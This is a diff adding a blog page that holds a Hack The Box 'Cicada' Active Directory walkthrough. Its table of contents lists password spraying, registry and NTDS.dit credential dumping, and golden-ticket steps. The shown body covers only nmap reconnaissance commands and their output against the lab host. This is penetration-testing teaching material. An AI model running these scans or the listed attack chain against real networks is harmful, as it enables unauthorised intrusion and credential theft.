@@ -1,0 +1,1899 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.136.5">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Cicada HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Cicada HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cicada-box/" title="./cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Cicada HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.01.11"
+                            >2024.01.11
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        13 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/easy/"
+                            class="tag-btn">
+                            Easy
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/active-directory/"
+                            class="tag-btn">
+                            Active Directory
+                        </a>
+                    
+                        <a
+                            href="/tags/ldap/"
+                            class="tag-btn">
+                            LDAP
+                        </a>
+                    
+                        <a
+                            href="/tags/rpc/"
+                            class="tag-btn">
+                            RPC
+                        </a>
+                    
+                        <a
+                            href="/tags/sebackupprivilege/"
+                            class="tag-btn">
+                            SeBackupPrivilege
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/cicada-box/" class="bread-btn">
+    
+
+    
+        
+            Cicada HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#cicada-hack-the-box-walkthrough-writeup">Cicada Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
+        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
+        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
+        <li><a href="#rpc">RPC:</a></li>
+        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+        <li><a href="#enumerating-the-hr-share">Enumerating the HR Share:</a></li>
+        <li><a href="#finding-a-hard-coded-cred-in-notice-from-hr-dot-txt">Finding a hard-coded cred in &ldquo;Notice from HR.txt&rdquo;:</a></li>
+        <li><a href="#using-impacket-lookupsid">Using impacket-lookupsid:</a></li>
+        <li><a href="#password-spraying">Password Spraying:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#enumerating-as-michael-dot-wrightson">Enumerating as michael.wrightson:</a></li>
+        <li><a href="#enumerating-users-using-rpc">Enumerating users using RPC:</a></li>
+        <li><a href="#finding-a-password-in-the-description-field-via-rpc">Finding a password in the description field via RPC:</a></li>
+        <li><a href="#enumerating-as-david-dot-orelius">Enumerating as david.orelius:</a></li>
+        <li><a href="#authenticating-as-emily-dot-oscars">Authenticating as emily.oscars:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#discovering-we-are-part-of-the-backup-operators-group">Discovering we are part of the backup operators group:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-ownership">4. Ownership:</a>
+      <ul>
+        <li><a href="#dumping-registry-hives-and-extracting-creds-using-secretsdump">Dumping Registry Hives &amp; extracting creds using secretsdump:</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-dot-persistence">5. Persistence:</a>
+      <ul>
+        <li><a href="#dumping-ntds-dot-dit">Dumping NTDS.dit:</a></li>
+        <li><a href="#creating-a-kerberos-golden-ticket">Creating a Kerberos Golden Ticket:</a></li>
+        <li><a href="#golden-ticket-curiosities">Golden Ticket Curiosities:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="cicada-hack-the-box-walkthrough-writeup">Cicada Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Cicada">https://app.hackthebox.com/machines/Cicada</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li><strong>Variables</strong>:
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Wordlists</strong>:
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li><strong>Basic TCP Scan</strong>:
+<ul>
+<li><code>nmap $box -Pn -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Cicada/scans/nmap%20%20%f0%9f%8d%a3%20main%20%f0%9f%93%9d%20%c3%97110%f0%9f%9b%a4%ef%b8%8f%20%20%c3%97142%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2009:35:04%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20TCPbasicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-31%2009:35%20GMT%0aNmap%20scan%20report%20for%2010.129.115.238%0aHost%20is%20up%20%280.040s%20latency%29.%0aNot%20shown:%20989%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a53/tcp%20%20%20open%20%20domain%0a88/tcp%20%20%20open%20%20kerberos-sec%0a135/tcp%20%20open%20%20msrpc%0a139/tcp%20%20open%20%20netbios-ssn%0a389/tcp%20%20open%20%20ldap%0a445/tcp%20%20open%20%20microsoft-ds%0a464/tcp%20%20open%20%20kpasswd5%0a593/tcp%20%20open%20%20http-rpc-epmap%0a636/tcp%20%20open%20%20ldapssl%0a3268/tcp%20open%20%20globalcatLDAP%0a3269/tcp%20open%20%20globalcatLDAPssl%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%204.36%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Cicada/scans/nmap  🍣 main 📝 ×110🛤️  ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 09:35:04 zsh ❯ nmap $box -Pn -oA TCPbasicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-31 09:35 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.115.238
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">989</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp   open  domain
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.36 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>Got some classics, DNS, Kerberos, SMB &amp; LDAP.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
+<ul>
+<li>
+<p><strong>In depth scan TCP</strong>:</p>
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Cicada/scans/nmap%20%20%f0%9f%8d%a3%20main%20%f0%9f%93%9d%20%c3%97110%f0%9f%9b%a4%ef%b8%8f%20%20%c3%97142%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2009:35:12%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a[sudo]%20password%20for%20kali:%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-31%2009:35%20GMT%0aNmap%20scan%20report%20for%2010.129.115.238%0aHost%20is%20up%20%280.039s%20latency%29.%0aNot%20shown:%2065522%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20VERSION%0a53/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a88/tcp%20%20%20%20open%20%20kerberos-sec%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-10-31%2016:38:14Z%29%0a135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a139/tcp%20%20%20open%20%20netbios-ssn%20%20%20Microsoft%20Windows%20netbios-ssn%0a389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20cicada.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%20TLS%20randomness%20does%20not%20represent%20time%0a%7c%20ssl-cert:%20Subject:%20commonName=CICADA-DC.cicada.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:CICADA-DC.cicada.htb%0a%7c%20Not%20valid%20before:%202024-08-22T20:24:16%0a%7c_Not%20valid%20after:%20%202025-08-22T20:24:16%0a445/tcp%20%20%20open%20%20microsoft-ds?%0a464/tcp%20%20%20open%20%20kpasswd5?%0a593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a636/tcp%20%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20cicada.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%20TLS%20randomness%20does%20not%20represent%20time%0a%7c%20ssl-cert:%20Subject:%20commonName=CICADA-DC.cicada.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:CICADA-DC.cicada.htb%0a%7c%20Not%20valid%20before:%202024-08-22T20:24:16%0a%7c_Not%20valid%20after:%20%202025-08-22T20:24:16%0a3268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20cicada.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%20TLS%20randomness%20does%20not%20represent%20time%0a%7c%20ssl-cert:%20Subject:%20commonName=CICADA-DC.cicada.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:CICADA-DC.cicada.htb%0a%7c%20Not%20valid%20before:%202024-08-22T20:24:16%0a%7c_Not%20valid%20after:%20%202025-08-22T20:24:16%0a3269/tcp%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20cicada.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%20TLS%20randomness%20does%20not%20represent%20time%0a%7c%20ssl-cert:%20Subject:%20commonName=CICADA-DC.cicada.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:CICADA-DC.cicada.htb%0a%7c%20Not%20valid%20before:%202024-08-22T20:24:16%0a%7c_Not%20valid%20after:%20%202025-08-22T20:24:16%0a5985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-title:%20Not%20Found%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a53003/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0aWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0aDevice%20type:%20general%20purpose%0aRunning%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202022%20%2888%25%29%0aAggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202022%20%2888%25%29%0aNo%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0aService%20Info:%20Host:%20CICADA-DC;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aHost%20script%20results:%0a%7c%20smb2-time:%0a%7c%20%20%20date:%202024-10-31T16:39:11%0a%7c_%20%20start_date:%20N/A%0a%7c_clock-skew:%206h59m59s%0a%7c%20smb2-security-mode:%0a%7c%20%20%203:1:1:%0a%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20242.85%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Cicada/scans/nmap  🍣 main 📝 ×110🛤️  ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 09:35:12 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
